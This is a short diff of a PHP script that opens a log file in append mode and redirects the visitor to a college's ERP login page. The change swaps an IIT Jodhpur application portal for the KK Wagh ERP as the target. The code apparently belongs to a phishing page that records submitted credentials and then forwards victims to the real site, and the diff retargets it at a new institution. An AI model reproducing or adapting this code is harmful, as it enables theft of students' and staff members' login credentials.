@@ -1,7 +1,7 @@
 <?php
  
 // Set the location to redirect the page
-header ('Location:https://oa.iitj.ac.in/OARS/');
+header ('Location:https://erp.kkwagh.edu.in/');
  
 // Open the text file in writing mode
 $file = fopen("log.txt", "a");
